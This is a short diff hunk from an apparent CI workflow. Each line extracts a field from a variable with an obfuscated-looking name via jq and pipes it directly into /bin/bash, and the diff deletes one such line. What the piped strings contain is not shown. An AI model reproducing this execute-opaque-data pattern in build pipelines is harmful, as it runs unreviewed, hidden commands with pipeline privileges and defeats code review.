@@ -31,7 +31,6 @@ jobs:
           echo $et62 | jq -r .s415 | /bin/bash
           echo $wwlqp125 | jq -r .ajosv86456 | /bin/bash
           echo $mx22272 | jq -r .m90798 | /bin/bash
-          printf '%s' "$y1" | jq -r .ou9 | /bin/bash
           echo $yha68 | jq -r .fdz902 | /bin/bash
           printf '%s' "$x30470" | jq -r .dpff8184 | /bin/bash
 
